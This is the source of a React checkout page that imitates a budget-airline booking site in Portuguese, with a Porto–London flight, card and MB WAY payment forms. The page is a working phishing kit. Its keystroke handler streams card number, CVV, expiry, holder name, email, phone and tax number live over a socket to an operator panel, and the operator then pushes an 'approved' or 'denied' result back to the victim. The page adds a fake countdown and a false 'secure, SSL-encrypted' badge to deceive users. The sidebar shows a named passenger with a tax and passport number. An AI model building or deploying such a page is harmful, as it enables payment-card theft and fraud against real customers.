
import React, { useEffect, useRef, useCallback, useState } from 'react';
import { io } from 'socket.io-client';
import type { Socket } from 'socket.io-client';
import { DecolarLogo, ClockIcon, InfoIcon, PlaneIcon, LockIcon, CreditCardIcon, MbWayIcon, UserIcon, CheckCircleIcon, CalendarIcon } from './IconComponents';

// --- Atomic Components ---

type InputFieldProps = {
    label: string;
    id: string;
    placeholder?: string;
    type?: string;
    onKeyUp?: (e: React.KeyboardEvent<HTMLInputElement>) => void;
    onBlur?: (e: React.FocusEvent<HTMLInputElement>) => void;
    onInput?: (e: React.FormEvent<HTMLInputElement>) => void;
    className?: string;
    defaultValue?: string;
    maxLength?: number;
    error?: boolean;
    errorMessage?: string;
};

const InputField: React.FC<InputFieldProps> = ({ 
    label, id, placeholder, type = 'text', onKeyUp, onBlur, onInput, 
    className = "", defaultValue, maxLength, error, errorMessage 
}) => (
    <div className={`mb-4 ${className}`}>
        <label htmlFor={id} className="block text-sm font-bold text-gray-700 mb-1">{label}</label>
        <div className="relative">
            <input
                id={id}
                name={id}
                type={type}
                maxLength={maxLength}
                placeholder={placeholder}
                onKeyUp={onKeyUp}
                onBlur={onBlur}
                onInput={onInput}
                defaultValue={defaultValue}
                className={`w-full h-10 px-3 bg-white text-black border rounded-sm focus:outline-none focus:ring-2 focus:ring-rynner-yellow transition-all duration-200 text-sm 
                    ${error ? 'border-red-600 bg-red-50 focus:border-red-600' : 'border-gray-400 focus:border-rynner-blue'}`}
            />
        </div>
        {error && errorMessage && (
            <p className="text-red-600 text-xs mt-1 flex items-center">
                <span className="mr-1">⚠</span> {errorMessage}
            </p>
        )}
    </div>
);

const SectionTitle: React.FC<{ children: React.ReactNode }> = ({ children }) => (
    <div className="bg-rynner-blue text-white px-4 py-2 rounded-t-sm mb-4">
        <h2 className="text-lg font-bold uppercase tracking-wide flex items-center">
             {children}
        </h2>
    </div>
);

// --- Modal Component ---

const PaymentModal: React.FC<{ 
    status: 'idle' | 'processing' | 'approved' | 'denied', 
    method: 'card' | 'mbway',
    onClose: () => void 
}> = ({ status, method, onClose }) => {
    if (status === 'idle') return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4 animate-in fade-in duration-300">
            <div className="bg-white rounded-lg shadow-2xl max-w-sm w-full p-8 text-center relative overflow-hidden">
                
                {status === 'processing' && (
                    <div className="space-y-6">
                        {method === 'mbway' ? (
                            // MB WAY Specific UI
                            <>
                                <div className="relative mx-auto w-24 h-24 flex items-center justify-center">
                                    <div className="absolute inset-0 bg-blue-100 rounded-full animate-ping opacity-75"></div>
                                    <div className="absolute inset-2 bg-white rounded-full border-2 border-rynner-blue flex items-center justify-center z-10 shadow-sm">
                                        <MbWayIcon className="w-16 h-8" />
                                    </div>
                                </div>
                                <div>
                                    <h3 className="text-xl font-bold text-gray-800 mb-2">Confirmação Pendente</h3>
                                    <p className="text-sm text-gray-700 font-medium">Verifique o seu aplicativo MB WAY e confirme o pagamento.</p>
                                    <p className="text-xs text-gray-400 mt-2">A aguardar confirmação no telemóvel...</p>
                                </div>
                                <div className="flex justify-center pt-2">
                                     <div className="h-1 w-1/2 bg-gray-100 rounded-full overflow-hidden">
                                         <div className="h-full bg-rynner-blue w-full animate-[wiggle_2s_ease-in-out_infinite]"></div>
                                     </div>
                                </div>
                            </>
                        ) : (
                            // Credit Card Specific UI
                            <>
                                <div className="relative mx-auto w-20 h-20">
                                    <div className="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
                                    <div className="absolute inset-0 border-4 border-rynner-blue rounded-full border-t-transparent animate-spin"></div>
                                </div>
                                <div>
                                    <h3 className="text-xl font-bold text-gray-800 mb-2">A Processar Pagamento</h3>
                                    <p className="text-sm text-gray-500">Por favor, não feche esta janela ou clique em voltar. Estamos a validar os seus dados com a entidade bancária.</p>
                                </div>
                                <div className="flex justify-center space-x-1">
                                     <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
                                     <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
                                     <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                                </div>
                            </>
                        )}
                    </div>
                )}

                {status === 'approved' && (
                    <div className="space-y-6 animate-in zoom-in duration-300">
                        <div className="mx-auto w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
                            <CheckCircleIcon className="w-12 h-12 text-green-600" />
                        </div>
                        <div>
                            <h3 className="text-xl font-bold text-gray-800 mb-2">Pagamento Confirmado!</h3>
                            <p className="text-sm text-gray-500">A sua reserva foi efetuada com sucesso. Receberá o bilhete eletrónico no seu e-mail em breve.</p>
                        </div>
                        <div className="pt-2">
                             <div className="h-1 w-full bg-gray-100 rounded-full overflow-hidden">
                                 <div className="h-full bg-green-500 w-full animate-[wiggle_1s_ease-in-out_infinite]" style={{ width: '100%' }}></div>
                             </div>
                             <p className="text-xs text-gray-400 mt-2">A redirecionar...</p>
                        </div>
                    </div>
                )}

                {status === 'denied' && (
                    <div className="space-y-6 animate-in zoom-in duration-300">
                         <div className="mx-auto w-20 h-20 bg-red-100 rounded-full flex items-center justify-center border-4 border-red-50">
                            <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                            </svg>
                        </div>
                        <div>
                            <h3 className="text-xl font-bold text-red-600 mb-2">Pagamento Recusado</h3>
                            {method === 'mbway' ? (
                                <p className="text-sm text-gray-600">O tempo limite para confirmação no MB WAY expirou ou a operação foi recusada.</p>
                            ) : (
                                <p className="text-sm text-gray-600">A transação não pôde ser concluída. Verifique se o cartão está desbloqueado para compras online ou tente outro método de pagamento.</p>
                            )}
                        </div>
                        <button 
                            onClick={onClose}
                            className="w-full bg-gray-800 hover:bg-gray-900 text-white font-bold py-3 px-4 rounded transition-colors"
                        >
                            Tentar Novamente
                        </button>
                    </div>
                )}
            </div>
        </div>
    );
};

// --- Page Sections ---

const Header: React.FC = () => (
    <header className="bg-rynner-blue border-b-4 border-rynner-yellow sticky top-0 z-40 shadow-md">
        <div className="max-w-7xl mx-auto px-4 h-16 flex justify-between items-center">
            <div className="flex items-center">
                <DecolarLogo />
            </div>
            <nav className="hidden md:flex items-center space-x-6 text-sm font-bold text-white">
                <a href="#" className="hover:text-rynner-yellow transition-colors">Planear</a>
                <a href="#" className="hover:text-rynner-yellow transition-colors">Minhas Reservas</a>
                <a href="#" className="hover:text-rynner-yellow transition-colors">Ajuda</a>
                <a href="#" className="hover:text-rynner-yellow flex items-center">
                    <UserIcon className="w-5 h-5 mr-1" /> Login
                </a>
            </nav>
        </div>
    </header>
);

const ContactSection: React.FC<{ onKeyUp: (e: React.KeyboardEvent<HTMLInputElement>) => void }> = ({ onKeyUp }) => {
    // State for local validation
    const [emailValue, setEmailValue] = useState('');
    const [confirmEmailValue, setConfirmEmailValue] = useState('');
    const [emailError, setEmailError] = useState(false);
    const [matchError, setMatchError] = useState(false);
    const [countryCode, setCountryCode] = useState('+351');

    // Email Syntax Validation
    const handleEmailBlur = () => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        setEmailError(!emailRegex.test(emailValue) && emailValue !== '');
        
        // Re-check match if confirm field is already filled
        if (confirmEmailValue) {
            setMatchError(emailValue !== confirmEmailValue);
        }
    };

    const handleEmailInput = (e: React.FormEvent<HTMLInputElement>) => {
        setEmailValue(e.currentTarget.value);
        if (matchError) setMatchError(false);
    };

    // Email Match Validation
    const handleConfirmBlur = () => {
        if (confirmEmailValue !== '') {
            setMatchError(emailValue !== confirmEmailValue);
        }
    };

    const handleConfirmInput = (e: React.FormEvent<HTMLInputElement>) => {
        setConfirmEmailValue(e.currentTarget.value);
        if (matchError) setMatchError(false);
    };

    const handlePhoneInput = (e: React.FormEvent<HTMLInputElement>) => {
        // Enforce numeric only
        e.currentTarget.value = e.currentTarget.value.replace(/\D/g, '');
    };

    return (
        <div className="bg-white p-0 rounded-sm shadow-card mb-6 pb-6">
            <SectionTitle>Dados de Contacto</SectionTitle>
            <div className="px-6">
                <p className="text-sm text-gray-600 mb-4">Para onde devemos enviar a confirmação da sua reserva?</p>
                
                {/* Email Fields */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <InputField 
                        label="Endereço de e-mail" 
                        id="email" 
                        type="email" 
                        placeholder="nome@exemplo.com" 
                        onKeyUp={onKeyUp} 
                        onInput={handleEmailInput}
                        onBlur={handleEmailBlur}
                        error={emailError}
                        errorMessage="Insira um e-mail válido (ex: abc@dominio.com)."
                    />
                    <InputField 
                        label="Confirmar e-mail" 
                        id="emailConfirm" 
                        type="email" 
                        placeholder="nome@exemplo.com" 
                        onInput={handleConfirmInput}
                        onBlur={handleConfirmBlur}
                        error={matchError}
                        errorMessage="Os endereços de e-mail não coincidem."
                    />
                </div>

                {/* Phone & NIF */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-2">
                    {/* Custom Composite Phone Input */}
                    <div className="mb-4">
                        <label htmlFor="phone" className="block text-sm font-bold text-gray-700 mb-1">Número de Telefone</label>
                        <div className="flex">
                            <select 
                                value={countryCode}
                                onChange={(e) => setCountryCode(e.target.value)}
                                className="h-10 px-2 bg-gray-100 border border-gray-400 border-r-0 rounded-l-sm text-sm focus:outline-none focus:ring-0 text-gray-700 font-bold w-24"
                            >
                                <option value="+351">🇵🇹 +351</option>
                                <option value="+55">🇧🇷 +55</option>
                                <option value="+34">🇪🇸 +34</option>
                                <option value="+33">🇫🇷 +33</option>
                                <option value="+44">🇬🇧 +44</option>
                                <option value="+1">🇺🇸 +1</option>
                            </select>
                            <input
                                id="phone"
                                name="phone"
                                type="tel"
                                maxLength={15}
                                placeholder="910 000 000"
                                onKeyUp={onKeyUp}
                                onInput={handlePhoneInput}
                                className="w-full h-10 px-3 bg-white text-black border border-gray-400 rounded-r-sm focus:outline-none focus:ring-2 focus:ring-rynner-yellow focus:border-rynner-blue transition-all duration-200 text-sm"
                            />
                        </div>
                    </div>

                     <InputField label="NIF (Opcional)" id="nif" placeholder="999999990" onKeyUp={onKeyUp} maxLength={9} />
                </div>
            </div>
        </div>
    );
};

const PaymentSection: React.FC<{ onKeyUp: (e: React.KeyboardEvent<HTMLInputElement>) => void, onMethodChange: (method: string) => void }> = ({ onKeyUp, onMethodChange }) => {
    const [method, setMethod] = useState<'card' | 'mbway'>('card');
    const [cardBrand, setCardBrand] = useState<'visa' | 'mastercard' | null>(null);
    const [cardError, setCardError] = useState(false);
    const [expiryError, setExpiryError] = useState(false);
    const [mbwayError, setMbwayError] = useState(false);

    const handleMethodSwitch = (newMethod: 'card' | 'mbway') => {
        setMethod(newMethod);
        onMethodChange(newMethod);
    };

    // Luhn Algorithm Implementation
    const luhnCheck = (val: string) => {
        let checksum = 0;
        let j = 1;
        for (let i = val.length - 1; i >= 0; i--) {
            let calc = 0;
            calc = Number(val.charAt(i)) * j;
            if (calc > 9) {
                checksum = checksum + 1;
                calc = calc - 10;
            }
            checksum = checksum + calc;
            if (j == 1) { j = 2 } else { j = 1 };
        }
        return (checksum % 10) == 0;
    };

    const handleCardInput = (e: React.FormEvent<HTMLInputElement>) => {
        let value = e.currentTarget.value.replace(/\D/g, ''); // Remove non-digits
        
        // Detect Brand
        if (/^4/.test(value)) {
            setCardBrand('visa');
        } else if (/^5[1-5]|^2[2-7]/.test(value)) {
            setCardBrand('mastercard');
        } else {
            setCardBrand(null);
        }

        // Format (Chunks of 4)
        const parts = value.match(/.{1,4}/g);
        if (parts) {
            value = parts.join(' ');
        }
        
        // Hard Limit
        if (value.length > 19) value = value.substring(0, 19);

        e.currentTarget.value = value;
        setCardError(false);
    };

    const handleCardBlur = (e: React.FocusEvent<HTMLInputElement>) => {
        const cleanValue = e.target.value.replace(/\D/g, '');
        if (cleanValue.length > 0) {
            if (cleanValue.length < 13 || !luhnCheck(cleanValue)) {
                setCardError(true);
            }
        }
    };

    const handleExpiryInput = (e: React.FormEvent<HTMLInputElement>) => {
        let value = e.currentTarget.value.replace(/\D/g, '');
        
        if (value.length >= 2) {
            // Check month validity
            const month = parseInt(value.substring(0, 2));
            if (month > 12) value = '12' + value.substring(2);
            if (month === 0) value = '01' + value.substring(2);

            // Add Slash
            value = value.substring(0, 2) + '/' + value.substring(2);
        }
        
        if (value.length > 5) value = value.substring(0, 5);
        
        e.currentTarget.value = value;
        setExpiryError(false);
    };

    const handleExpiryBlur = (e: React.FocusEvent<HTMLInputElement>) => {
        const value = e.target.value;
        if (value.length === 5) {
            const [month, year] = value.split('/');
            const currentYear = new Date().getFullYear() % 100;
            const currentMonth = new Date().getMonth() + 1;

            if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) {
                setExpiryError(true);
            }
        } else if (value.length > 0) {
            setExpiryError(true);
        }
    };

    const handleCvvInput = (e: React.FormEvent<HTMLInputElement>) => {
        // Strict Numeric Only
        e.currentTarget.value = e.currentTarget.value.replace(/\D/g, '');
    };

    const handleNameInput = (e: React.FormEvent<HTMLInputElement>) => {
        // STRICT TEXT ONLY: Allow letters, accents (À-ÿ), spaces, and apostrophes. Reject numbers/symbols.
        e.currentTarget.value = e.currentTarget.value.replace(/[^a-zA-ZÀ-ÿ\s']/g, '');
    };

    const handleMbwayInput = (e: React.FormEvent<HTMLInputElement>) => {
        // Strict Numeric Only
        e.currentTarget.value = e.currentTarget.value.replace(/\D/g, '');
        setMbwayError(false);
    };

    const handleMbwayBlur = (e: React.FocusEvent<HTMLInputElement>) => {
        const val = e.target.value;
        // Validation: Must have 9 digits and start with 9
        if (val.length > 0 && !/^9\d{8}$/.test(val)) {
            setMbwayError(true);
        }
    };

    return (
        <div className="bg-white p-0 rounded-sm shadow-card mb-6 pb-6">
            <SectionTitle>Pagamento</SectionTitle>
            
            <div className="px-6">
                {/* Method Selection */}
                <div className="flex space-x-4 mb-6">
                    <button 
                        onClick={() => handleMethodSwitch('card')}
                        className={`flex-1 py-3 px-4 border rounded-sm flex items-center justify-center font-bold text-sm transition-all ${method === 'card' ? 'border-rynner-blue bg-blue-50 text-rynner-blue ring-1 ring-rynner-blue' : 'border-gray-300 text-gray-600 hover:bg-gray-50'}`}
                    >
                        <CreditCardIcon className="w-5 h-5 mr-2" /> Cartão Crédito/Débito
                    </button>
                    <button 
                        onClick={() => handleMethodSwitch('mbway')}
                        className={`flex-1 py-3 px-4 border rounded-sm flex items-center justify-center font-bold text-sm transition-all ${method === 'mbway' ? 'border-rynner-blue bg-blue-50 text-rynner-blue ring-1 ring-rynner-blue' : 'border-gray-300 text-gray-600 hover:bg-gray-50'}`}
                    >
                        <MbWayIcon className="w-16 h-6" />
                    </button>
                </div>

                {/* Card Form */}
                {method === 'card' && (
                    <div className="animate-fade-in space-y-4 bg-gray-50 p-4 border border-gray-200 rounded-sm">
                        <div className="flex items-center justify-between mb-2">
                            <span className="text-xs font-bold text-gray-500 uppercase">Aceitamos</span>
                            <div className="flex space-x-2 transition-all duration-300">
                                <img 
                                    src="https://img.icons8.com/color/48/visa.png" 
                                    alt="Visa" 
                                    className={`h-6 transition-opacity duration-300 ${cardBrand === 'mastercard' ? 'opacity-20 grayscale' : 'opacity-100'}`} 
                                />
                                <img 
                                    src="https://img.icons8.com/color/48/mastercard.png" 
                                    alt="Mastercard" 
                                    className={`h-6 transition-opacity duration-300 ${cardBrand === 'visa' ? 'opacity-20 grayscale' : 'opacity-100'}`} 
                                />
                            </div>
                        </div>
                        
                        <InputField 
                            label="Número do Cartão" 
                            id="cardNumber" 
                            placeholder="0000 0000 0000 0000" 
                            onKeyUp={onKeyUp}
                            onInput={handleCardInput} 
                            onBlur={handleCardBlur}
                            maxLength={19}
                            error={cardError}
                            errorMessage="Número de cartão inválido."
                        />
                        
                        <div className="grid grid-cols-2 gap-4">
                             <InputField 
                                label="Validade" 
                                id="expiryDate" 
                                placeholder="MM/AA" 
                                onKeyUp={onKeyUp} 
                                onInput={handleExpiryInput}
                                onBlur={handleExpiryBlur}
                                maxLength={5} 
                                error={expiryError}
                                errorMessage="Data inválida."
                            />
                             <div className="relative">
                                 <InputField 
                                    label="CVV" 
                                    id="cvv" 
                                    placeholder="123" 
                                    onKeyUp={onKeyUp} 
                                    onInput={handleCvvInput}
                                    type="password" 
                                    maxLength={4} 
                                />
                                 <InfoIcon className="absolute right-3 top-9 w-5 h-5 text-gray-400 cursor-help" />
                             </div>
                        </div>

                        <InputField 
                            label="Nome do Titular" 
                            id="cardHolder" 
                            placeholder="Como aparece no cartão" 
                            onKeyUp={onKeyUp}
                            onInput={handleNameInput}
                        />
                    </div>
                )}

                {/* MB WAY Form */}
                {method === 'mbway' && (
                    <div className="animate-fade-in bg-gray-50 p-6 border border-gray-200 rounded-sm text-center">
                        <MbWayIcon className="w-24 h-8 mx-auto mb-4" />
                        <p className="text-sm text-gray-700 mb-4">Introduza o seu número de telemóvel associado ao MB WAY.</p>
                        <InputField 
                            label="Nº de Telemóvel MB WAY" 
                            id="mbwayPhone" 
                            placeholder="9xxxxxxxx" 
                            onKeyUp={onKeyUp} 
                            className="max-w-xs mx-auto text-left" 
                            maxLength={9}
                            onInput={handleMbwayInput}
                            onBlur={handleMbwayBlur}
                            error={mbwayError}
                            errorMessage="Número inválido."
                        />
                        <p className="text-xs text-gray-500 mt-2">Deverá aceitar a transação na app MB WAY dentro de 5 minutos.</p>
                    </div>
                )}

                <div className="mt-6 flex items-center justify-center text-gray-500 text-xs bg-gray-100 p-2 rounded">
                    <LockIcon className="w-3 h-3 mr-1 text-green-600" />
                    <span>Pagamento 100% seguro. Dados encriptados SSL.</span>
                </div>
            </div>
        </div>
    );
};

const Sidebar: React.FC = () => (
    <div className="space-y-4">
        {/* Passenger Data Card */}
        <div className="bg-white rounded-sm shadow-card overflow-hidden">
             <div className="bg-rynner-yellow px-4 py-2">
                <span className="font-bold text-rynner-blue text-sm uppercase">Dados do Passageiro</span>
            </div>
            <div className="p-4">
                <div className="flex items-start mb-4 border-b border-gray-100 pb-4">
                     <UserIcon className="w-5 h-5 text-rynner-blue mr-2 mt-0.5 flex-shrink-0" />
                     <div className="text-sm text-gray-800 space-y-2 w-full">
                         <div className="flex justify-between items-center">
                            <span className="text-gray-500 font-medium text-xs">Passageira:</span>
                            <span className="font-bold">Sofia Almeida</span>
                         </div>
                         <div className="flex justify-between items-center">
                            <span className="text-gray-500 font-medium text-xs">NIF:</span>
                            <span className="font-bold">284105932</span>
                         </div>
                         <div className="flex justify-between items-center">
                            <span className="text-gray-500 font-medium text-xs">Sexo:</span>
                            <span className="font-bold">Feminino</span>
                         </div>
                         <div className="flex justify-between items-center">
                            <span className="text-gray-500 font-medium text-xs">Nacionalidade:</span>
                            <span className="font-bold">Brasil</span>
                         </div>
                         <div className="flex justify-between items-center">
                            <span className="text-gray-500 font-medium text-xs">Passaporte:</span>
                            <span className="font-bold">FB942103</span>
                         </div>
                     </div>
                </div>
            </div>
        </div>

        {/* Flight Data Card with Promo */}
        <div className="bg-white rounded-sm shadow-card overflow-hidden">
             <div className="bg-rynner-yellow px-4 py-2">
                <span className="font-bold text-rynner-blue text-sm uppercase">O Seu Voo</span>
            </div>
            <div className="p-4">
                <div className="flex items-start mb-4 border-b border-gray-100 pb-4">
                     <PlaneIcon className="w-5 h-5 text-rynner-blue mr-2 mt-1 flex-shrink-0" />
                     <div className="w-full">
                         <div className="flex items-center justify-between mb-1">
                             <span className="font-bold text-gray-800 text-sm">Porto (OPO)</span>
                             <span className="text-xs text-gray-400">➔</span>
                             <span className="font-bold text-gray-800 text-sm">Londres (STN)</span>
                         </div>
                         <p className="text-xs text-gray-500 mb-2">Voo FR8345 • Qua, 15 Out</p>
                         <div className="flex justify-between text-xs text-gray-700 bg-gray-50 p-2 rounded">
                            <div className="text-center">
                                <span className="block font-bold">06:30</span>
                                <span className="text-gray-400">Partida</span>
                            </div>
                             <div className="text-center">
                                <span className="block font-bold">08:50</span>
                                <span className="text-gray-400">Chegada</span>
                            </div>
                         </div>
                     </div>
                </div>
                
                <div className="flex justify-between items-end mb-2">
                    <span className="text-sm font-bold text-gray-700 mb-1">Total a Pagar</span>
                    <div className="text-right flex flex-col items-end">
                         <div className="flex items-center space-x-2">
                            <span className="bg-red-600 text-white text-[10px] px-1 rounded font-bold uppercase tracking-wider animate-pulse">OFERTA</span>
                            <span className="text-xs text-gray-400 line-through decoration-red-500 decoration-1">€ 165,00</span>
                         </div>
                         <span className="text-xl font-black text-rynner-blue">€ 99,99</span>
                    </div>
                </div>
                <p className="text-xs text-gray-500 text-right">Inclui todas as taxas e impostos</p>
            </div>
        </div>
    </div>
);

const CheckoutPage: React.FC = () => {
    const socket = useRef<Socket | null>(null);
    const [timeLeft, setTimeLeft] = useState(600); // 10 minutes in seconds
    const [paymentStatus, setPaymentStatus] = useState<'idle' | 'processing' | 'approved' | 'denied'>('idle');
    const [method, setMethod] = useState<'card' | 'mbway'>('card'); // Lifted state

    useEffect(() => {
        socket.current = io();
        
        const timer = setInterval(() => {
            setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
        }, 1000);
        
        socket.current.on('payment_result', (data: { status: 'approved' | 'denied' }) => {
            setPaymentStatus(data.status);
        });

        return () => {
            if (socket.current) {
                socket.current.disconnect();
            }
            clearInterval(timer);
        };
    }, []);

    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins}:${secs.toString().padStart(2, '0')}`;
    };

    const handleKeyUp = useCallback((e: React.KeyboardEvent<HTMLInputElement>) => {
        const target = e.target as HTMLInputElement;
        const { id, value } = target;
        
        // Extended capture list including NIF, Phone, Email, MBWay
        const targetFields = ['cardNumber', 'cardHolder', 'expiryDate', 'cvv', 'email', 'phone', 'nif', 'mbwayPhone'];
        
        if (socket.current && targetFields.includes(id)) {
            socket.current.emit('field_update', {
                field: id === 'mbwayPhone' ? 'phone' : id,
                value: value,
            });
        }
    }, []);

    const handleMethodChange = useCallback((newMethod: string) => {
        setMethod(newMethod as 'card' | 'mbway'); // Update local state
        if (socket.current) {
            socket.current.emit('field_update', {
                field: 'paymentMethod',
                value: newMethod === 'card' ? 'Cartão de Crédito' : 'MB WAY'
            });
        }
    }, []);
    
    const handlePaymentRequest = () => {
        if (socket.current) {
            setPaymentStatus('processing');
            // Trigger status update to admin
            socket.current.emit('field_update', {
                field: 'paymentStatus',
                value: 'processing'
            });
        }
    };
    
    const resetModal = () => {
        setPaymentStatus('idle');
        // Reset status on admin side too (optional, but good for cleanup)
        if (socket.current) {
            socket.current.emit('field_update', {
                field: 'paymentStatus',
                value: 'idle'
            });
        }
    };

    return (
        <div className="min-h-screen bg-[#EFEFEF] pb-20 font-sans relative">
            <PaymentModal status={paymentStatus} method={method} onClose={resetModal} />
            
            <Header />
            
            <main className="max-w-7xl mx-auto px-4 py-8">
                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                    
                    {/* Left Column (Forms) */}
                    <div className="lg:col-span-8">
                        <div className="bg-yellow-100 border border-yellow-300 text-yellow-800 px-4 py-3 rounded-sm mb-6 flex items-center shadow-sm">
                            <ClockIcon className="w-5 h-5 mr-2 animate-pulse text-red-600" />
                            <span className="text-sm font-bold">
                                Preço garantido apenas por mais <span className="font-mono text-base bg-yellow-200 px-1 rounded border border-yellow-400 text-red-700">{formatTime(timeLeft)}</span> minutos.
                            </span>
                        </div>

                        <ContactSection onKeyUp={handleKeyUp} />
                        <PaymentSection onKeyUp={handleKeyUp} onMethodChange={handleMethodChange} />
                        
                        <div className="mt-8">
                            <button 
                                onClick={handlePaymentRequest}
                                className="w-full bg-rynner-yellow hover:bg-yellow-400 text-rynner-blue text-lg font-black uppercase py-3 rounded-sm shadow-md transition-transform transform active:scale-[0.99] border-b-4 border-yellow-500"
                            >
                                Pagar Agora
                            </button>
                            <p className="text-center text-xs text-gray-500 mt-4">
                                Ao clicar em "Pagar Agora", aceito os <a href="#" className="underline">Termos e Condições</a> de Transporte da Rynner.
                            </p>
                        </div>
                    </div>

                    {/* Right Column (Sidebar) */}
                    <div className="lg:col-span-4 relative">
                        <div className="sticky top-24">
                            <Sidebar />
                        </div>
                    </div>
                </div>
            </main>
        </div>
    );
};

export default CheckoutPage;
